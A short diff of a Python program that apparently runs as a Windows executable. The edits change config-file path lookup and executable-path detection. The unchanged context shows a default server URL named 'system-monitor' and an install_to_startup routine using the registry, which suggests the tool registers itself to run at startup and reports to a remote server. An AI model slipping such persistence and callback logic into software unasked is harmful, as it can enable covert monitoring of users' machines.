@@ -41,11 +41,10 @@ def get_config_file_path():
             if os.path.exists(bundle_c):
                 return bundle_c
         exe_dir = os.path.dirname(os.path.abspath(sys.executable))
-        c_path = os.path.join(exe_dir, "config.json")
-        if os.path.exists(c_path):
-            return c_path
-    script_dir = os.path.dirname(os.path.abspath(__file__))
-    return os.path.join(script_dir, "config.json")
+        return os.path.join(exe_dir, "config.json")
+    
+    base_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else os.getcwd()
+    return os.path.join(base_dir, "config.json")
 
 
 DEFAULT_SERVER_URL = "https://system-monitor-s3q7.onrender.com"
@@ -940,7 +939,7 @@ def install_to_startup():
 
     try:
         import winreg, shutil, sys, subprocess
-        current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+        current_exe = sys.executable if getattr(sys, 'frozen', False) else (os.path.abspath(__file__) if '__file__' in globals() else (sys.argv[0] if sys.argv else ''))
         if not current_exe.endswith('.exe'):
             return
 
